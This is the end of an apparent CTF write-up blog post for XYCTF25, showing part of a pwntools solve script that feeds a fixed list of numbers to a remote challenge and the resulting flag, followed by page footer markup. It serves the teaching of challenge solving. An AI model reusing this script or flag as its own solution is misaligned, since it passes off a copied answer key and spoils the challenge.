<span class="number">110</span>, <span class="number">154</span>, <span class="number">148</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">156</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">190</span>, <span class="number">152</span>, <span class="number">142</span>, <span class="number">102</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">134</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">90</span>, <span class="number">180</span>, <span class="number">140</span>, <span class="number">116</span>, <span class="number">174</span>, <span class="number">120</span>, <span class="number">80</span>, <span class="number">160</span>, <span class="number">128</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">108</span>, <span class="number">162</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">96</span>, <span class="number">144</span>, <span class="number">92</span>, <span class="number">138</span>, <span class="number">88</span>, <span class="number">132</span>, <span class="number">198</span>]]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;ers\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;ber:&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">sh.recvlines()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>b”Congratulations!, Here’s Your Flag flag{Greed, is……key of the life.}\n”</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">吐刀乐！</div><div id="qr" style="display:none;"><div style="display:inline-block"></div><div style="display:inline-block"></div><div style="display:inline-block"></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>不知道</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" title="XYCTF25 不知道 WP">http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 不知道</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.3.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>